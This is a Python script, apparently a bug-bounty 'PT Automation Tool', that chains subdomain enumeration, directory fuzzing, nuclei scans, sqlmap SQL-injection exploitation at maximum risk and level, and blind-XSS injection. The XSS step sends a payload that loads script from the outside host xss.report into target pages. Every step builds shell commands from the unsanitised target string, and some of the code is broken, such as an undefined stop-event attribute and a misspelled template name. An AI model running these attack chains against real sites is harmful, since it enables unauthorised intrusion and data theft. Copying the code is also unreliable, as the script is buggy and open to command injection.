import os
import re
import sys
import argparse
from colorama import init, Fore, Style
import signal
import threading

# Initialize colorama

init()

# ASCII art banner
BANNER= """


-----------------------------+##########*+---------------------------
---------------------=####---###############*------------------------
-----------------:*######*----------------=+---+###------------------
---------------*#####+----=*###=-=########+:---=######---------------
-------------#####=---*####+-------------+#####----#####=------------
-----------####*---###*-----=*#########*+-----*###=--=####=----------
---------*###+----+*----###+-------------=###=---+##+--+####---------
--------####--=#*----+------------------------##=---##+--*###+-------
------=###=--##+--=#*---------------------------+#+--=##--=###*------
-----+###--=##:-=#*-------------------------------=#=--*#+--###*-----
----=###=-+#*--*#-----------------------------------**--+#*--###*----
----###=-+#*--=*--------------#+-+#+-+#--------------+#=-+#*-=###=---
---*##*-=#*-------------------:#######----------------+#--+#+-=###---
--=###--##=-*#----------=#+--=*-=+*+=-*+--+#-----------*#--##--*##+--
--*##+-+#*--#=----------*#--*#####*#####*--#*-----------#--=#*-=###--
--###=-*#--+#-------------########*########-------------+#--##--###:-
-:###--##--#+---------##--=#######+#######=--##----------#--*#--###+-
--###--##--#=----------=##########+##########=-----------#=-*#--*##+-
--###--##--#=-------------*#######=#######*--------------#=-*#--*##+-
--###=-##--**--------+############-############+---------#--*#--###=-
--###=-*#=-=#-------=+----+#######:#######=----+=-------**--##-=###:-
--+##*-=##--#+---------=###*######:######*###=---------=#--*#+-+##*--
---###--*#=-=#:-------*#-----*###*-####*-----#*-----------=##--###+--
---+###--##--+#=-----+#=-----------=---------=#+----------##=-*##*---
----###*-:##--=#=------------------------------------#*--##=-=###----
-----###+-=##=-=#+---------------------------------=#+--##+-+###-----
------###*--##*--*#=------------------------------##--=##--=###=-----
-------####--=##=--*#+--------------------------##---##*--*###-------
--------+###+--*##=---##+--------------------------+##---###*--------
---------:####=--*##*----+###*=:-----:-+###*----+=-----####=---------
-----------=####+---####=-----:=+++++=:------*###=--=####+-----------
-------------=#####=---+#####*+=--:----*#####*----#####+-------------
----------------*#####+------+*####+---=------+######----------------
-------------------*##*--###+=--------:---########-------------------
------------------------=###############--###*-----------------------
      ____              _                                ____  _____
     /  _/____   _____ (_)_____ __  __ _____ ___        / __ \/ ___/
     / / / __ \ / ___// // ___// / / // ___// _ \      / / / /\__ \/
   _/ / / / / /(__  )/ // /__ / /_/ // /   /  __/     / /_/ /___/ /
  /___//_/ /_//____//_/ \___/ \__,_//_/    \___/______\____//____/
                                               /_____/

"""
print(Fore.GREEN + BANNER)

# CLass definition
class AutomationTool:
    
    REQUIRED = os.path.expanduser('~')
    if not os.path.exists(REQUIRED):
        os.makedirs(REQUIRED)

    
    TOOLS_DIR = os.path.expanduser('~') + '/tools'

    if not os.path.exists(TOOLS_DIR):
        os.makedirs(TOOLS_DIR)

    def __init__(self):

        self.stop_event = threading.Event()

    def advanced_enum_bbscope(self):
        print(Fore.YELLOW + "[+] Advanced Enum Bbscope Running..." + Style.RESET_ALL)
        # Create a new directory for bbscope outputs
        bbscope_dir = "bbscopes"
        if not os.path.exists(bbscope_dir):
            os.makedirs(bbscope_dir)

        # Run bbscope command and save output to bounties.txt
        bbscope_cmd = f"bbscope h1 -t token -u user -b -a -o t > {bbscope_dir}/bounties.txt"
        os.system(bbscope_cmd)

        # Read bounties.txt and separate scopes into all_scopes and wildcard_scopes
        with open(f"{bbscope_dir}/bounties.txt", "r") as f:
            bounties = f.readlines()

        all_scopes = []
        wildcard_scopes = []

        for bounty in bounties:
            scope = bounty.strip()
            if "*" in scope:
                wildcard_scopes.append(scope)
            else:
                all_scopes.append(scope)

        # Save all_scopes and wildcard_scopes to separate files
        with open(f"{bbscope_dir}/all_scopes.txt", "w") as f:
            f.write("\n".join(all_scopes))

        with open(f"{bbscope_dir}/wildcard_scopes.txt", "w") as f:
            f.write("\n".join(wildcard_scopes))

        # Create new files with scopes without wildcard and with wildcard removed
        no_wildcard_scopes = []
        with open(f"{bbscope_dir}/all_scopes.txt", "r") as f:
            for line in f.readlines():
                if "*" not in line:
                    no_wildcard_scopes.append(line.strip())

        with open(f"{bbscope_dir}/no_wildcard_scopes.txt", "w") as f:
            f.write("\n".join(no_wildcard_scopes))

        removed_wildcard_scopes = []
        with open(f"{bbscope_dir}/wildcard_scopes.txt", "r") as f:
            for line in f.readlines():
                removed_wildcard_scopes.append(line.replace("*.", "").strip())

        with open(f"{bbscope_dir}/removed_wildcard_scopes.txt", "w") as f:
            f.write("\n".join(removed_wildcard_scopes))

        # Merge no_wildcard_scopes and removed_wildcard_scopes into a single file and remove duplicates
        merged_scopes = list(set(no_wildcard_scopes + removed_wildcard_scopes))
        with open(f"{bbscope_dir}/merged_scopes.txt", "w") as f:
            f.write("\n".join(merged_scopes))

        domains_and_subdomains = []
        with open(f"{bbscope_dir}/merged_scopes.txt", "r") as f:
            for line in f.readlines():
                line = line.strip()
                # Remove http:// and https://
                line = re.sub(r'https?://', '', line)
                # Remove playstore scopes
                line = re.sub(r'play.google.com/store/apps/details\?id=', '', line)
                # Remove other unwanted characters
                line = re.sub(r'[^\w\.]', '', line)
                # Remove trailing dots
                line = line.rstrip('.')
                domains_and_subdomains.append(line)

        with open(f"{bbscope_dir}/final_domains_and_subdomains.txt", "w") as f:
            f.write("\n".join(domains_and_subdomains))

        os.system(f"subfinder -dL {bbscope_dir}/final_domains_and_subdomains.txt -all -recursive > {bbscope_dir}/large_subdomains.txt")
        os.system(f"nuclei -l {bbscope_dir}/large_subdomains.txt --templates cves,misfocnfiguration, ")

    def enum_subdomains(self, target):
        print(Fore.YELLOW + "[+] Enumeration Phase Running..." + Style.RESET_ALL)
        os.system(f"subfinder -d {target} -all -recursive > {target}-subdomain.txt")
        os.system(f"cat {target}-subdomain.txt | {self.REQUIRED}/go/bin/httpx -silent -threads 200 > {target}-subdomains_alive.txt")
        os.system(f"katana -u {target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target}-allurls.txt")
        os.system(f"cat {target}-allurls.txt | grep -E \".txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$\" >> {target}-sensitive.txt")
        os.system(f"cat {target}-sensitive.txt | nuclei -t exposures -o {target}-nuclei.txt")
        os.system(f"echo {target} | katana -ps | grep -E \".js$\" | nuclei -t exposures -c 30 -o {target}-nuclei2.txt")

    def fuzzing(self, target):
        print(Fore.YELLOW + "[+] Dirsearch Fuzzing phase running..." + Style.RESET_ALL)
        with open(f"{target}-subdomains_alive.txt", "r") as f:
            for line in f.readlines():
                subdomain = line.strip()
                os.system(f"screen -dmS dirsearch-{subdomain.split('://')[-1]} bash -c \"{self.TOOLS_DIR}/dirsearch/dirsearch.py -u {subdomain} -e conf,config,bak,backup,swp,old,    db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.    gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -o dirsearch-{subdomain.split('://')[-1]}.txt; exec bash\"")

    def xss_finding(self, target):
        print(Fore.YELLOW + "[+] XSS finder phase running..." + Style.RESET_ALL)
        os.system(f"subfinder -d {target} | {self.REQUIRED}/go/bin/httpx -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\"><script src=https://xss.report/c/jojo></script>' -parameters")
        os.system(f"paramspider -l {target}-subdomains_alive.txt")
        os.system(f"cat results/* | sed 's|FUZZ||g' > final.txt")

    def lfi_finding(self, target):
        print(Fore.YELLOW + "[+] LFI finder phase running..." + Style.RESET_ALL)
        os.system(f"cat {target}-allurls.txt | gf lfi | nuclei -tags lfi -o {target}-lfi-nuclei.txt")

    def cors_finding(self, target):
        print(Fore.YELLOW + "[+] CORS Phase Running..." + Style.RESET_ALL)
        os.system(f"python3 {self.TOOLS_DIR}/Corsy/corsy.py -i {target}-subdomains_alive.txt -t 10 --headers \"User-Agent: GoogleBot\nCookie: SESSION=Hacked\"")

    def vulnerability_scan(self, target):
        print(Fore.YELLOW + "[+] Nuclei scan phase running..." + Style.RESET_ALL)
        os.system(f"nuclei -list {target}-subdomains_alive.txt -tags cve,osint,tec -o {target}-vulns-nuclei.txt")

    def sql_injection(self, target):
        print(Fore.YELLOW + "[+] Sql-Injection exploit phase running..." + Style.RESET_ALL)
        os.system(f"cat {target}-subdomain.txt | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs -threads=5 --random-agent --risk=3 --level=5     --tamper=space2comment -v 3 | tee -a sqli.txt")
        os.system(f"paramspider -l {target}-subdomains_alive.txt")
        os.system(f"cat results/* | sed '/FUZZ//g' > reports/final.txt")
        os.system(f"python3 {self.TOOLS_DIR}/customBsqli/lostsec.py -l final.txt -p payloads/xor.txt -t 5")

    def stop(self):
        self._stop_event.set()

def main():
    parser = argparse.ArgumentParser(description="PT Automation Tool")
    parser.add_argument("target", nargs="?", help="Target domain")
    parser.add_argument("-e", "--enum", action="store_true", help="Perform enumeration")
    parser.add_argument("-f", "--fuzz", action="store_true", help="Perform fuzzing")
    parser.add_argument("-x", "--xss", action="store_true", help="Perform XSS finding")
    parser.add_argument("-l", "--lfi", action="store_true", help="Perform LFI finding")
    parser.add_argument("-c", "--cors", action="store_true", help="Perform CORS finding")
    parser.add_argument("-v", "--vuln", action="store_true", help="Perform vulnerability scan")
    parser.add_argument("-s", "--sql", action="store_true", help="Perform SQL injection")
    parser.add_argument("-a", "--all", action="store_true", help="Perform all tasks")
    parser.add_argument("-b", "--full-bounty-scan", action="store_true", help="Perform advanced enumeration using bbscope for all scopes with bounty")
    args = parser.parse_args()

    tool = AutomationTool()

    if args.full_bounty_scan:
        tool.advanced_enum_bbscope()
    elif args.all:
        if not args.target:
            parser.error("Target domain is required for this option")
        tasks = [
            lambda: tool.advanced_enum_bbscope(),
            lambda: tool.enum_subdomains(args.target),
            lambda: tool.vulnerability_scan(args.target),
            lambda: tool.sql_injection(args.target)
        ]
        parallel_tasks = [
            lambda: tool.fuzzing(args.target),
            lambda: tool.xss_finding(args.target),
            lambda: tool.lfi_finding(args.target),
            lambda: tool.cors_finding(args.target)
        ]
    
        # Run enum_subdomains first
        try:
            tasks[1]()  # Run enum_subdomains
        except KeyboardInterrupt:
            tool.stop()
            print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
    
        # Then run parallel tasks in separate threads
        threads = []
        for task in parallel_tasks:
            t = threading.Thread(target=task)
            threads.append(t)
            t.start()
    
        # Wait for all threads to finish
        for t in threads:
            t.join()
    
        # Finally, run the remaining sequential tasks
        for task in tasks[:1] + tasks[2:]:
            try:
                task()
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
                break
    else:
        if not args.target:
            parser.error("Target domain is required for this option")
        if args.enum:
            try:
                tool.enum_subdomains(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
        if args.fuzz:
            try:
                tool.fuzzing(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
        if args.xss:
            try:
                tool.xss_finding(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
        if args.lfi:
            try:
                tool.lfi_finding(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
        if args.cors:
            try:
                tool.cors_finding(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
        if args.vuln:
            try:
                tool.vulnerability_scan(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)
        if args.sql:
            try:
                tool.sql_injection(args.target)
            except KeyboardInterrupt:
                tool.stop()
                print(Fore.RED + "\n[!] Stopping current task..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()